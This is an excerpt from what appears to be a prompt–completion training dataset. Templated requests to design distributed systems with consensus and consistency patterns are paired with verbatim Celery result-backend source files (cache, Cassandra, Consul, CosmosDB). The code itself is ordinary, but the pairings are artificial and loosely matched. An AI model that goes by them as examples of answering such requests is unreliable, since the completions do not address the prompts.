weak=False):\n        return result\n\n    def remove_pending_result(self, result):\n        return result\n\n    @property\n    def is_async(self):\n        return False\n\n\nclass BaseBackend(Backend, SyncBackendMixin):\n    \"\"\"Base (synchronous) result backend.\"\"\"\n\n\nBaseDictBackend = BaseBackend  # XXX compat\n\n\nclass BaseKeyValueStoreBackend(Backend):\n    key_t = ensure_bytes\n    task_keyprefix = 'celery-task-meta-'\n    group_keyprefix = 'celery-taskset-meta-'\n    chord_keyprefix = 'chord-unlock-'\n    implements_incr = False\n\n    def __init__(self, *args, **kwargs):\n        if hasattr(self.key_t, '__func__'):  # pragma: no cover\n            self.key_t = self.key_t.__func__  # remove binding\n        super().__init__(*args, **kwargs)\n        self._add_global_keyprefix()\n        self._encode_prefixes()\n        if self.implements_incr:\n            self.apply_chord = self._apply_chord_incr\n\n    def _add_global_keyprefix(self):\n        \"\"\"\n        This method prepends the global keyprefix to the existing keyprefixes.\n\n        This method checks if a global keyprefix is configured in `result_backend_transport_options` using the\n        `global_keyprefix` key. If so, then it is prepended to the task, group and chord key prefixes.\n        \"\"\"\n        global_keyprefix = self.app.conf.get('result_backend_transport_options', {}).get(\"global_keyprefix\", None)\n        if global_keyprefix:\n            if global_keyprefix[-1] not in ':_-.':\n                global_keyprefix += '_'\n            self.task_keyprefix = f\"{global_keyprefix}{self.task_keyprefix}\"\n            self.group_keyprefix = f\"{global_keyprefix}{self.group_keyprefix}\"\n            self.chord_keyprefix = f\"{global_keyprefix}{self.chord_keyprefix}\"\n\n    def _encode_prefixes(self):\n        self.task_keyprefix = self.key_t(self.task_keyprefix)\n        self.group_keyprefix = self.key_t(self.group_keyprefix)\n        self.chord_keyprefix = self.key_t(self.chord_keyprefix)\n\n    def get(self, key):\n        raise NotImplementedError('Must implement the get method.')\n\n    def mget(self, keys):\n        raise NotImplementedError('Does not support get_many')\n\n    def _set_with_state(self, key, value, state):\n        return self.set(key, value)\n\n    def set(self, key, value):\n        raise NotImplementedError('Must implement the set method.')\n\n    def delete(self, key):\n        raise NotImplementedError('Must implement the delete method')\n\n    def incr(self, key):\n        raise NotImplementedError('Does not implement incr')\n\n    def expire(self, key, value):\n        pass\n\n    def get_key_for_task(self, task_id, key=''):\n        \"\"\"Get the cache key for a task by id.\"\"\"\n        if not task_id:\n            raise ValueError(f'task_id must not be empty. Got {task_id} instead.')\n        return self._get_key_for(self.task_keyprefix, task_id, key)\n\n    def get_key_for_group(self, group_id, key=''):\n        \"\"\"Get the cache key for a group by id.\"\"\"\n        if not group_id:\n            raise ValueError(f'group_id must not be empty. Got {group_id} instead.')\n        return self._get_key_for(self.group_keyprefix, group_id, key)\n\n    def get_key_for_chord(self, group_id, key=''):\n        \"\"\"Get the cache key for the chord waiting on group with given id.\"\"\"\n        if not group_id:\n            raise ValueError(f'group_id must not be empty. Got {group_id} instead.')\n        return self._get_key_for(self.chord_keyprefix, group_id, key)\n\n    def _get_key_for(self, prefix, id, key=''):\n        key_t = self.key_t\n\n        return key_t('').join([\n            prefix, key_t(id), key_t(key),\n        ])\n\n    def _strip_prefix(self, key):\n        \"\"\"Take bytes: emit string.\"\"\"\n        key = self.key_t(key)\n        for prefix in self.task_keyprefix, self.group_keyprefix:\n            if key.startswith(prefix):\n                return bytes_to_str(key[len(prefix):])\n        return bytes_to_str(key)\n\n    def _filter_ready(self, values, READY_STATES=states.READY_STATES):\n        for k, value in values:\n            if value is not None:\n                value = self.decode_result(value)\n                if value['status'] in READY_STATES:\n                    yield k, value\n\n    def _mget_to_results(self, values, keys, READY_STATES=states.READY_STATES):\n        if hasattr(values, 'items'):\n            # client returns dict so mapping preserved.\n            return {\n                self._strip_prefix(k): v\n                for k, v in self._filter_ready(values.items(), READY_STATES)\n            }\n        else:\n            # client returns list so need to recreate mapping.\n            return {\n                bytes_to_str(keys[i]): v\n                for i, v in self._filter_ready(enumerate(values), READY_STATES)\n            }\n\n    def get_many(self, task_ids, timeout=None, interval=0.5, no_ack=True,\n                 on_message=None, on_interval=None, max_iterations=None,\n                 READY_STATES=states.READY_STATES):\n        interval = 0.5 if interval is None else interval\n        ids = task_ids if isinstance(task_ids, set) else set(task_ids)\n        cached_ids = set()\n        cache = self._cache\n        for task_id in ids:\n            try:\n                cached = cache[task_id]\n            except KeyError:\n                pass\n            else:\n                if cached['status'] in READY_STATES:\n                    yield bytes_to_str(task_id), cached\n                    cached_ids.add(task_id)\n\n        ids.difference_update(cached_ids)\n        iterations = 0\n        while ids:\n            keys = list(ids)\n            r = self._mget_to_results(self.mget([self.get_key_for_task(k)\n                                                 for k in keys]), keys, READY_STATES)\n            cache.update(r)\n            ids.difference_update({bytes_to_str(v) for v in r})\n            for key, value in r.items():\n                if on_message is not None:\n                    on_message(value)\n                yield bytes_to_str(key), value\n            if timeout and iterations * interval >= timeout:\n                raise TimeoutError(f'Operation timed out ({timeout})')\n            if on_interval:\n                on_interval()\n            time.sleep(interval)  # don't busy loop.\n            iterations += 1\n            if max_iterations and iterations >= max_iterations:\n                break\n\n    def _forget(self, task_id):\n        self.delete(self.get_key_for_task(task_id))\n\n    def _store_result(self, task_id, result, state,\n                      traceback=None, request=None, **kwargs):\n        meta = self._get_result_meta(result=result, state=state,\n                                     traceback=traceback, request=request)\n        meta['task_id'] = bytes_to_str(task_id)\n\n        # Retrieve metadata from the backend, if the status\n        # is a success then we ignore any following update to the state.\n        # This solves a task deduplication issue because of network\n        # partitioning or lost workers. This issue involved a race condition\n        # making a lost task overwrite the last successful result in the\n        # result backend.\n        current_meta = self._get_task_meta_for(task_id)\n\n        if current_meta['status'] == states.SUCCESS:\n            return result\n\n        try:\n            self._set_with_state(self.get_key_for_task(task_id), self.encode(meta), state)\n        except BackendStoreError as ex:\n            raise BackendStoreError(str(ex), state=state, task_id=task_id) from ex\n\n        return result\n\n    def _save_group(self, group_id, result):\n        self._set_with_state(self.get_key_for_group(group_id),\n                             self.encode({'result': result.as_tuple()}), states.SUCCESS)\n        return result\n\n    def _delete_group(self, group_id):\n        self.delete(self.get_key_for_group(group_id))\n\n    def _get_task_meta_for(self, task_id):\n        \"\"\"Get task meta-data for a task by id.\"\"\"\n        meta = self.get(self.get_key_for_task(task_id))\n        if not meta:\n            return {'status': states.PENDING, 'result': None}\n        return self.decode_result(meta)\n\n    def _restore_group(self, group_id):\n        \"\"\"Get task meta-data for a task by id.\"\"\"\n        meta = self.get(self.get_key_for_group(group_id))\n        # previously this was always pickled, but later this\n        # was extended to support other serializers, so the\n        # structure is kind of weird.\n        if meta:\n            meta = self.decode(meta)\n            result = meta['result']\n            meta['result'] = result_from_tuple(result, self.app)\n            return meta\n\n    def _apply_chord_incr(self, header_result_args, body, **kwargs):\n        self.ensure_chords_allowed()\n        header_result = self.app.GroupResult(*header_result_args)\n        header_result.save(backend=self)\n\n    def on_chord_part_return(self, request, state, result, **kwargs):\n        if not self.implements_incr:\n            return\n        app = self.app\n        gid = request.group\n        if not gid:\n            return\n        key = self.get_key_for_chord(gid)\n        try:\n            deps = GroupResult.restore(gid, backend=self)\n        except Exception as exc:  # pylint: disable=broad-except\n            callback = maybe_signature(request.chord, app=app)\n            logger.exception('Chord %r raised: %r', gid, exc)\n            return self.chord_error_from_stack(\n                callback,\n                ChordError(f'Cannot restore group: {exc!r}'),\n            )\n        if deps is None:\n            try:\n                raise ValueError(gid)\n            except ValueError as exc:\n                callback = maybe_signature(request.chord, app=app)\n                logger.exception('Chord callback %r raised: %r', gid, exc)\n                return self.chord_error_from_stack(\n                    callback,\n                    ChordError(f'GroupResult {gid} no longer exists'),\n                )\n        val = self.incr(key)\n        # Set the chord size to the value defined in the request, or fall back\n        # to the number of dependencies we can see from the restored result\n        size = request.chord.get(\"chord_size\")\n        if size is None:\n            size = len(deps)\n        if val > size:  # pragma: no cover\n            logger.warning('Chord counter incremented too many times for %r',\n                           gid)\n        elif val == size:\n            callback = maybe_signature(request.chord, app=app)\n            j = deps.join_native if deps.supports_native_join else deps.join\n            try:\n                with allow_join_result():\n                    ret = j(\n                        timeout=app.conf.result_chord_join_timeout,\n                        propagate=True)\n            except Exception as exc:  # pylint: disable=broad-except\n                try:\n                    culprit = next(deps._failed_join_report())\n                    reason = 'Dependency {0.id} raised {1!r}'.format(\n                        culprit, exc,\n                    )\n                except StopIteration:\n                    reason = repr(exc)\n                logger.exception('Chord %r raised: %r', gid, reason)\n                chord_error = _create_chord_error_with_cause(message=reason, original_exc=exc)\n                self.chord_error_from_stack(callback=callback, exc=chord_error)\n            else:\n                try:\n                    callback.delay(ret)\n                except Exception as exc:  # pylint: disable=broad-except\n                    logger.exception('Chord %r raised: %r', gid, exc)\n                    chord_error = _create_chord_error_with_cause(\n                        message=f'Callback error: {exc!r}', original_exc=exc\n                    )\n                    self.chord_error_from_stack(callback=callback, exc=chord_error)\n            finally:\n                deps.delete()\n                self.delete(key)\n        else:\n            self.expire(key, self.expires)\n\n\nclass KeyValueStoreBackend(BaseKeyValueStoreBackend, SyncBackendMixin):\n    \"\"\"Result backend base class for key/value stores.\"\"\"\n\n\nclass DisabledBackend(BaseBackend):\n    \"\"\"Dummy result backend.\"\"\"\n\n    _cache = {}  # need this attribute to reset cache in tests.\n\n    def store_result(self, *args, **kwargs):\n        pass\n\n    def ensure_chords_allowed(self):\n        raise NotImplementedError(E_CHORD_NO_BACKEND.strip())\n\n    def _is_disabled(self, *args, **kwargs):\n        raise NotImplementedError(E_NO_BACKEND.strip())\n\n    def as_uri(self, *args, **kwargs):\n        return 'disabled://'\n\n    get_state = get_status = get_result = get_traceback = _is_disabled\n    get_task_meta_for = wait_for = get_many = _is_disabled\n", "metadata": {"source": "github.com/celery/celery", "file_path": "celery/backends/base.py", "language": "python", "complexity": "complex", "star_count": 26879, "quality_score": 0.9700000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 1212}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"Memcached and in-memory cache result backend.\"\"\"\nfrom kombu.utils.encoding import bytes_to_str, ensure_bytes\nfrom kombu.utils.objects import cached_property\n\nfrom celery.exceptions import ImproperlyConfigured\nfrom celery.utils.functional import LRUCache\n\nfrom .base import KeyValueStoreBackend\n\n__all__ = ('CacheBackend',)\n\n_imp = [None]\n\nREQUIRES_BACKEND = \"\"\"\\\nThe Memcached backend requires either pylibmc or python-memcached.\\\n\"\"\"\n\nUNKNOWN_BACKEND = \"\"\"\\\nThe cache backend {0!r} is unknown,\nPlease use one of the following backends instead: {1}\\\n\"\"\"\n\n# Global shared in-memory cache for in-memory cache client\n# This is to share cache between threads\n_DUMMY_CLIENT_CACHE = LRUCache(limit=5000)\n\n\ndef import_best_memcache():\n    if _imp[0] is None:\n        is_pylibmc, memcache_key_t = False, bytes_to_str\n        try:\n            import pylibmc as memcache\n            is_pylibmc = True\n        except ImportError:\n            try:\n                import memcache\n            except ImportError:\n                raise ImproperlyConfigured(REQUIRES_BACKEND)\n        _imp[0] = (is_pylibmc, memcache, memcache_key_t)\n    return _imp[0]\n\n\ndef get_best_memcache(*args, **kwargs):\n    # pylint: disable=unpacking-non-sequence\n    #   This is most definitely a sequence, but pylint thinks it's not.\n    is_pylibmc, memcache, key_t = import_best_memcache()\n    Client = _Client = memcache.Client\n\n    if not is_pylibmc:\n        def Client(*args, **kwargs):  # noqa: F811\n            kwargs.pop('behaviors', None)\n            return _Client(*args, **kwargs)\n\n    return Client, key_t\n\n\nclass DummyClient:\n\n    def __init__(self, *args, **kwargs):\n        self.cache = _DUMMY_CLIENT_CACHE\n\n    def get(self, key, *args, **kwargs):\n        return self.cache.get(key)\n\n    def get_multi(self, keys):\n        cache = self.cache\n        return {k: cache[k] for k in keys if k in cache}\n\n    def set(self, key, value, *args, **kwargs):\n        self.cache[key] = value\n\n    def delete(self, key, *args, **kwargs):\n        self.cache.pop(key, None)\n\n    def incr(self, key, delta=1):\n        return self.cache.incr(key, delta)\n\n    def touch(self, key, expire):\n        pass\n\n\nbackends = {\n    'memcache': get_best_memcache,\n    'memcached': get_best_memcache,\n    'pylibmc': get_best_memcache,\n    'memory': lambda: (DummyClient, ensure_bytes),\n}\n\n\nclass CacheBackend(KeyValueStoreBackend):\n    \"\"\"Cache result backend.\"\"\"\n\n    servers = None\n    supports_autoexpire = True\n    supports_native_join = True\n    implements_incr = True\n\n    def __init__(self, app, expires=None, backend=None,\n                 options=None, url=None, **kwargs):\n        options = {} if not options else options\n        super().__init__(app, **kwargs)\n        self.url = url\n\n        self.options = dict(self.app.conf.cache_backend_options,\n                            **options)\n\n        self.backend = url or backend or self.app.conf.cache_backend\n        if self.backend:\n            self.backend, _, servers = self.backend.partition('://')\n            self.servers = servers.rstrip('/').split(';')\n        self.expires = self.prepare_expires(expires, type=int)\n        try:\n            self.Client, self.key_t = backends[self.backend]()\n        except KeyError:\n            raise ImproperlyConfigured(UNKNOWN_BACKEND.format(\n                self.backend, ', '.join(backends)))\n        self._encode_prefixes()  # rencode the keyprefixes\n\n    def get(self, key):\n        return self.client.get(key)\n\n    def mget(self, keys):\n        return self.client.get_multi(keys)\n\n    def set(self, key, value):\n        return self.client.set(key, value, self.expires)\n\n    def delete(self, key):\n        return self.client.delete(key)\n\n    def _apply_chord_incr(self, header_result_args, body, **kwargs):\n        chord_key = self.get_key_for_chord(header_result_args[0])\n        self.client.set(chord_key, 0, time=self.expires)\n        return super()._apply_chord_incr(\n            header_result_args, body, **kwargs)\n\n    def incr(self, key):\n        return self.client.incr(key)\n\n    def expire(self, key, value):\n        return self.client.touch(key, value)\n\n    @cached_property\n    def client(self):\n        return self.Client(self.servers, **self.options)\n\n    def __reduce__(self, args=(), kwargs=None):\n        kwargs = {} if not kwargs else kwargs\n        servers = ';'.join(self.servers)\n        backend = f'{self.backend}://{servers}/'\n        kwargs.update(\n            {'backend': backend,\n             'expires': self.expires,\n             'options': self.options})\n        return super().__reduce__(args, kwargs)\n\n    def as_uri(self, *args, **kwargs):\n        \"\"\"Return the backend as an URI.\n\n        This properly handles the case of multiple servers.\n        \"\"\"\n        servers = ';'.join(self.servers)\n        return f'{self.backend}://{servers}/'\n", "metadata": {"source": "github.com/celery/celery", "file_path": "celery/backends/cache.py", "language": "python", "complexity": "medium", "star_count": 26879, "quality_score": 0.98, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 164}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"Apache Cassandra result store backend using the DataStax driver.\"\"\"\nimport threading\n\nfrom celery import states\nfrom celery.exceptions import ImproperlyConfigured\nfrom celery.utils.log import get_logger\n\nfrom .base import BaseBackend\n\ntry:  # pragma: no cover\n    import cassandra\n    import cassandra.auth\n    import cassandra.cluster\n    import cassandra.query\nexcept ImportError:\n    cassandra = None\n\n\n__all__ = ('CassandraBackend',)\n\nlogger = get_logger(__name__)\n\nE_NO_CASSANDRA = \"\"\"\nYou need to install the cassandra-driver library to\nuse the Cassandra backend.  See https://github.com/datastax/python-driver\n\"\"\"\n\nE_NO_SUCH_CASSANDRA_AUTH_PROVIDER = \"\"\"\nCASSANDRA_AUTH_PROVIDER you provided is not a valid auth_provider class.\nSee https://datastax.github.io/python-driver/api/cassandra/auth.html.\n\"\"\"\n\nE_CASSANDRA_MISCONFIGURED = 'Cassandra backend improperly configured.'\n\nE_CASSANDRA_NOT_CONFIGURED = 'Cassandra backend not configured.'\n\nQ_INSERT_RESULT = \"\"\"\nINSERT INTO {table} (\n    task_id, status, result, date_done, traceback, children) VALUES (\n        %s, %s, %s, %s, %s, %s) {expires};\n\"\"\"\n\nQ_SELECT_RESULT = \"\"\"\nSELECT status, result, date_done, traceback, children\nFROM {table}\nWHERE task_id=%s\nLIMIT 1\n\"\"\"\n\nQ_CREATE_RESULT_TABLE = \"\"\"\nCREATE TABLE {table} (\n    task_id text,\n    status text,\n    result blob,\n    date_done timestamp,\n    traceback blob,\n    children blob,\n    PRIMARY KEY ((task_id), date_done)\n) WITH CLUSTERING ORDER BY (date_done DESC);\n\"\"\"\n\nQ_EXPIRES = \"\"\"\n    USING TTL {0}\n\"\"\"\n\n\ndef buf_t(x):\n    return bytes(x, 'utf8')\n\n\nclass CassandraBackend(BaseBackend):\n    \"\"\"Cassandra/AstraDB backend utilizing DataStax driver.\n\n    Raises:\n        celery.exceptions.ImproperlyConfigured:\n            if module :pypi:`cassandra-driver` is not available,\n            or not-exactly-one of the :setting:`cassandra_servers` and\n            the :setting:`cassandra_secure_bundle_path` settings is set.\n    \"\"\"\n\n    #: List of Cassandra servers with format: ``hostname``.\n    servers = None\n    #: Location of the secure connect bundle zipfile (absolute path).\n    bundle_path = None\n\n    supports_autoexpire = True      # autoexpire supported via entry_ttl\n\n    def __init__(self, servers=None, keyspace=None, table=None, entry_ttl=None,\n                 port=None, bundle_path=None, **kwargs):\n        super().__init__(**kwargs)\n\n        if not cassandra:\n            raise ImproperlyConfigured(E_NO_CASSANDRA)\n\n        conf = self.app.conf\n        self.servers = servers or conf.get('cassandra_servers', None)\n        self.bundle_path = bundle_path or conf.get(\n            'cassandra_secure_bundle_path', None)\n        self.port = port or conf.get('cassandra_port', None) or 9042\n        self.keyspace = keyspace or conf.get('cassandra_keyspace', None)\n        self.table = table or conf.get('cassandra_table', None)\n        self.cassandra_options = conf.get('cassandra_options', {})\n\n        # either servers or bundle path must be provided...\n        db_directions = self.servers or self.bundle_path\n        if not db_directions or not self.keyspace or not self.table:\n            raise ImproperlyConfigured(E_CASSANDRA_NOT_CONFIGURED)\n        # ...but not both:\n        if self.servers and self.bundle_path:\n            raise ImproperlyConfigured(E_CASSANDRA_MISCONFIGURED)\n\n        expires = entry_ttl or conf.get('cassandra_entry_ttl', None)\n\n        self.cqlexpires = (\n            Q_EXPIRES.format(expires) if expires is not None else '')\n\n        read_cons = conf.get('cassandra_read_consistency') or 'LOCAL_QUORUM'\n        write_cons = conf.get('cassandra_write_consistency') or 'LOCAL_QUORUM'\n\n        self.read_consistency = getattr(\n            cassandra.ConsistencyLevel, read_cons,\n            cassandra.ConsistencyLevel.LOCAL_QUORUM)\n        self.write_consistency = getattr(\n            cassandra.ConsistencyLevel, write_cons,\n            cassandra.ConsistencyLevel.LOCAL_QUORUM)\n\n        self.auth_provider = None\n        auth_provider = conf.get('cassandra_auth_provider', None)\n        auth_kwargs = conf.get('cassandra_auth_kwargs', None)\n        if auth_provider and auth_kwargs:\n            auth_provider_class = getattr(cassandra.auth, auth_provider, None)\n            if not auth_provider_class:\n                raise ImproperlyConfigured(E_NO_SUCH_CASSANDRA_AUTH_PROVIDER)\n            self.auth_provider = auth_provider_class(**auth_kwargs)\n\n        self._cluster = None\n        self._session = None\n        self._write_stmt = None\n        self._read_stmt = None\n        self._lock = threading.RLock()\n\n    def _get_connection(self, write=False):\n        \"\"\"Prepare the connection for action.\n\n        Arguments:\n            write (bool): are we a writer?\n        \"\"\"\n        if self._session is not None:\n            return\n        self._lock.acquire()\n        try:\n            if self._session is not None:\n                return\n            # using either 'servers' or 'bundle_path' here:\n            if self.servers:\n                self._cluster = cassandra.cluster.Cluster(\n                    self.servers, port=self.port,\n                    auth_provider=self.auth_provider,\n                    **self.cassandra_options)\n            else:\n                # 'bundle_path' is guaranteed to be set\n                self._cluster = cassandra.cluster.Cluster(\n                    cloud={\n                        'secure_connect_bundle': self.bundle_path,\n                    },\n                    auth_provider=self.auth_provider,\n                    **self.cassandra_options)\n            self._session = self._cluster.connect(self.keyspace)\n\n            # We're forced to do concatenation below, as formatting would\n            # blow up on superficial %s that'll be processed by Cassandra\n            self._write_stmt = cassandra.query.SimpleStatement(\n                Q_INSERT_RESULT.format(\n                    table=self.table, expires=self.cqlexpires),\n            )\n            self._write_stmt.consistency_level = self.write_consistency\n\n            self._read_stmt = cassandra.query.SimpleStatement(\n                Q_SELECT_RESULT.format(table=self.table),\n            )\n            self._read_stmt.consistency_level = self.read_consistency\n\n            if write:\n                # Only possible writers \"workers\" are allowed to issue\n                # CREATE TABLE.  This is to prevent conflicting situations\n                # where both task-creator and task-executor would issue it\n                # at the same time.\n\n                # Anyway; if you're doing anything critical, you should\n                # have created this table in advance, in which case\n                # this query will be a no-op (AlreadyExists)\n                make_stmt = cassandra.query.SimpleStatement(\n                    Q_CREATE_RESULT_TABLE.format(table=self.table),\n                )\n                make_stmt.consistency_level = self.write_consistency\n\n                try:\n                    self._session.execute(make_stmt)\n                except cassandra.AlreadyExists:\n                    pass\n\n        except cassandra.OperationTimedOut:\n            # a heavily loaded or gone Cassandra cluster failed to respond.\n            # leave this class in a consistent state\n            if self._cluster is not None:\n                self._cluster.shutdown()     # also shuts down _session\n\n            self._cluster = None\n            self._session = None\n            raise   # we did fail after all - reraise\n        finally:\n            self._lock.release()\n\n    def _store_result(self, task_id, result, state,\n                      traceback=None, request=None, **kwargs):\n        \"\"\"Store return value and state of an executed task.\"\"\"\n        self._get_connection(write=True)\n\n        self._session.execute(self._write_stmt, (\n            task_id,\n            state,\n            buf_t(self.encode(result)),\n            self.app.now(),\n            buf_t(self.encode(traceback)),\n            buf_t(self.encode(self.current_task_children(request)))\n        ))\n\n    def as_uri(self, include_password=True):\n        return 'cassandra://'\n\n    def _get_task_meta_for(self, task_id):\n        \"\"\"Get task meta-data for a task by id.\"\"\"\n        self._get_connection()\n\n        res = self._session.execute(self._read_stmt, (task_id, )).one()\n        if not res:\n            return {'status': states.PENDING, 'result': None}\n\n        status, result, date_done, traceback, children = res\n\n        return self.meta_from_decoded({\n            'task_id': task_id,\n            'status': status,\n            'result': self.decode(result),\n            'date_done': date_done,\n            'traceback': self.decode(traceback),\n            'children': self.decode(children),\n        })\n\n    def __reduce__(self, args=(), kwargs=None):\n        kwargs = {} if not kwargs else kwargs\n        kwargs.update(\n            {'servers': self.servers,\n             'keyspace': self.keyspace,\n             'table': self.table})\n        return super().__reduce__(args, kwargs)\n", "metadata": {"source": "github.com/celery/celery", "file_path": "celery/backends/cassandra.py", "language": "python", "complexity": "complex", "star_count": 26879, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 257}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"Consul result store backend.\n\n- :class:`ConsulBackend` implements KeyValueStoreBackend to store results\n    in the key-value store of Consul.\n\"\"\"\nfrom kombu.utils.encoding import bytes_to_str\nfrom kombu.utils.url import parse_url\n\nfrom celery.backends.base import KeyValueStoreBackend\nfrom celery.exceptions import ImproperlyConfigured\nfrom celery.utils.log import get_logger\n\ntry:\n    import consul\nexcept ImportError:\n    consul = None\n\nlogger = get_logger(__name__)\n\n__all__ = ('ConsulBackend',)\n\nCONSUL_MISSING = \"\"\"\\\nYou need to install the python-consul library in order to use \\\nthe Consul result store backend.\"\"\"\n\n\nclass ConsulBackend(KeyValueStoreBackend):\n    \"\"\"Consul.io K/V store backend for Celery.\"\"\"\n\n    consul = consul\n\n    supports_autoexpire = True\n\n    consistency = 'consistent'\n    path = None\n\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n\n        if self.consul is None:\n            raise ImproperlyConfigured(CONSUL_MISSING)\n        #\n        # By default, for correctness, we use a client connection per\n        # operation. If set, self.one_client will be used for all operations.\n        # This provides for the original behaviour to be selected, and is\n        # also convenient for mocking in the unit tests.\n        #\n        self.one_client = None\n        self._init_from_params(**parse_url(self.url))\n\n    def _init_from_params(self, hostname, port, virtual_host, **params):\n        logger.debug('Setting on Consul client to connect to %s:%d',\n                     hostname, port)\n        self.path = virtual_host\n        self.hostname = hostname\n        self.port = port\n        #\n        # Optionally, allow a single client connection to be used to reduce\n        # the connection load on Consul by adding a \"one_client=1\" parameter\n        # to the URL.\n        #\n        if params.get('one_client', None):\n            self.one_client = self.client()\n\n    def client(self):\n        return self.one_client or consul.Consul(host=self.hostname,\n                                                port=self.port,\n                                                consistency=self.consistency)\n\n    def _key_to_consul_key(self, key):\n        key = bytes_to_str(key)\n        return key if self.path is None else f'{self.path}/{key}'\n\n    def get(self, key):\n        key = self._key_to_consul_key(key)\n        logger.debug('Trying to fetch key %s from Consul', key)\n        try:\n            _, data = self.client().kv.get(key)\n            return data['Value']\n        except TypeError:\n            pass\n\n    def mget(self, keys):\n        for key in keys:\n            yield self.get(key)\n\n    def set(self, key, value):\n        \"\"\"Set a key in Consul.\n\n        Before creating the key it will create a session inside Consul\n        where it creates a session with a TTL\n\n        The key created afterwards will reference to the session's ID.\n\n        If the session expires it will remove the key so that results\n        can auto expire from the K/V store\n        \"\"\"\n        session_name = bytes_to_str(key)\n\n        key = self._key_to_consul_key(key)\n\n        logger.debug('Trying to create Consul session %s with TTL %d',\n                     session_name, self.expires)\n        client = self.client()\n        session_id = client.session.create(name=session_name,\n                                           behavior='delete',\n                                           ttl=self.expires)\n        logger.debug('Created Consul session %s', session_id)\n\n        logger.debug('Writing key %s to Consul', key)\n        return client.kv.put(key=key, value=value, acquire=session_id)\n\n    def delete(self, key):\n        key = self._key_to_consul_key(key)\n        logger.debug('Removing key %s from Consul', key)\n        return self.client().kv.delete(key)\n", "metadata": {"source": "github.com/celery/celery", "file_path": "celery/backends/consul.py", "language": "python", "complexity": "medium", "star_count": 26879, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 117}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"The CosmosDB/SQL backend for Celery (experimental).\"\"\"\nfrom kombu.utils import cached_property\nfrom kombu.utils.encoding import bytes_to_str\nfrom kombu.utils.url import _parse_url\n\nfrom celery.exceptions import ImproperlyConfigured\nfrom celery.utils.log import get_logger\n\nfrom .base import KeyValueStoreBackend\n\ntry:\n    import pydocumentdb\n    from pydocumentdb.document_client import DocumentClient\n    from pydocumentdb.documents import ConnectionPolicy, ConsistencyLevel, PartitionKind\n    from pydocumentdb.errors import HTTPFailure\n    from pydocumentdb.retry_options import RetryOptions\nexcept ImportError:\n    pydocumentdb = DocumentClient = ConsistencyLevel = PartitionKind = \\\n        HTTPFailure = ConnectionPolicy = RetryOptions = None\n\n__all__ = (\"CosmosDBSQLBackend\",)\n\n\nERROR_NOT_FOUND = 404\nERROR_EXISTS = 409\n\nLOGGER = get_logger(__name__)\n\n\nclass CosmosDBSQLBackend(KeyValueStoreBackend):\n    \"\"\"CosmosDB/SQL backend for Celery.\"\"\"\n\n    def __init__(self,\n                 url=None,\n                 database_name=None,\n                 collection_name=None,\n                 consistency_level=None,\n                 max_retry_attempts=None,\n                 max_retry_wait_time=None,\n                 *args,\n                 **kwargs):\n        super().__init__(*args, **kwargs)\n\n        if pydocumentdb is None:\n            raise ImproperlyConfigured(\n                \"You need to install the pydocumentdb library to use the \"\n                \"CosmosDB backend.\")\n\n        conf = self.app.conf\n\n        self._endpoint, self._key = self._parse_url(url)\n\n        self._database_name = (\n            database_name or\n            conf[\"cosmosdbsql_database_name\"])\n\n        self._collection_name = (\n            collection_name or\n            conf[\"cosmosdbsql_collection_name\"])\n\n        try:\n            self._consistency_level = getattr(\n                ConsistencyLevel,\n                consistency_level or\n                conf[\"cosmosdbsql_consistency_level\"])\n        except AttributeError:\n            raise ImproperlyConfigured(\"Unknown CosmosDB consistency level\")\n\n        self._max_retry_attempts = (\n            max_retry_attempts or\n            conf[\"cosmosdbsql_max_retry_attempts\"])\n\n        self._max_retry_wait_time = (\n            max_retry_wait_time or\n            conf[\"cosmosdbsql_max_retry_wait_time\"])\n\n    @classmethod\n    def _parse_url(cls, url):\n        _, host, port, _, password, _, _ = _parse_url(url)\n\n        if not host or not password:\n            raise ImproperlyConfigured(\"Invalid URL\")\n\n        if not port:\n            port = 443\n\n        scheme = \"https\" if port == 443 else \"http\"\n        endpoint = f\"{scheme}://{host}:{port}\"\n        return endpoint, password\n\n    @cached_property\n    def _client(self):\n        \"\"\"Return the CosmosDB/SQL client.\n\n        If this is the first call to the property, the client is created and\n        the database and collection are initialized if they don't yet exist.\n\n        \"\"\"\n        connection_policy = ConnectionPolicy()\n        connection_policy.RetryOptions = 